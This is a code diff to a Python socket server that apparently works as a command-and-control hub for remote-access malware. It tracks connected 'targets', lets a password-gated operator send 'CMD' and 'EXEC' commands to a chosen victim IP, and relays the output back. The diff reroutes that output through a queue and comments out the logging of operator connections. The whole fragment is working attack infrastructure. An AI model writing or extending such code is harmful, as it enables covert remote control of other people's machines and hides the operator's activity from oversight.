@@ -14,6 +14,7 @@ class Server:
 		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.s.bind((SERVER_IP, SERVER_PORT))
 		self.targets_list = {}
+		self.temp_send_list = []
 
 
 	def ftp(self, conn: socket.socket, addr: list[str, int], req: str) -> None:
@@ -37,7 +38,7 @@ class Server:
 	
 
 	def super_client(self, conn: socket.socket, addr: list[str, int]) -> None:
-		print(f"{addr[0]}:{addr[1]}", "super user was connected")
+		# print(f"{addr[0]}:{addr[1]}", "super user was connected")
 		while True:		
 			try:
 				command = conn.recv(1024)
@@ -45,7 +46,7 @@ class Server:
 				content_splited = content.split(" ")
 
 			except:
-				print(f"{addr[0]}:{addr[1]}", "super user was disconnected")
+				# print(f"{addr[0]}:{addr[1]}", "super user was disconnected")
 				break
 			
 			if content_splited[0] == "all_clients":
@@ -58,8 +59,8 @@ class Server:
 			
 			elif content_splited[0] == "cmd" and len(content_splited) > 2:
 				cut = len(content_splited[0])+len(content_splited[1])+2
-				self.cmd_on_client(conn, content_splited[1], content[cut:])
-				conn.send(bytes(" ", "utf-8"))
+				self.cmd_on_client(content_splited[1], content[cut:])
+				self.temp_send_list.append(conn)
 
 			else:
 				conn.send(bytes(f"unknow command: {command.decode()}", "utf-8"))
@@ -70,9 +71,18 @@ class Server:
 			try:
 				req = conn.recv(1024)
 				content = req.decode()
+
 				if content.startswith(self.SUPER_PASSWORD):
 					self.super_client(conn, addr)
 					break
+				
+				if content.startswith("0"):
+					content = content[1:]
+
+				if content.startswith("CMD"):
+					self.temp_send_list[0].send(bytes(content[3:], encoding="utf-8"))
+					self.temp_send_list.pop(0)
+
 				else:
 					conn.send(b'0')
 					self.targets_list[addr[0]] = [conn, datetime.now(timezone.utc).strftime("%d.%m.%Y/%H.%M.%S")]
@@ -83,15 +93,13 @@ class Server:
 			# if content.startswith("FILE"):
 			# 	self.tcp(conn, addr, req)
 			# 	break
-			
 
 	def exec_on_client(self, ip, message):
 		self.targets_list[ip][0].send(bytes(f"EXEC|{message}", encoding="utf-8"))
 	
-	def cmd_on_client(self, conn, ip, message):
+	def cmd_on_client(self, ip, message):
 		self.targets_list[ip][0].send(bytes(f"CMD|{message}", encoding="utf-8"))
-		ret = conn.recv(1024)
-		conn.send(bytes(ret, encoding="utf-8"))
+
 
 	def start(self):
 		print(f"[{self.SERVER_IP}:{self.SERVER_PORT}]$ Server was started")
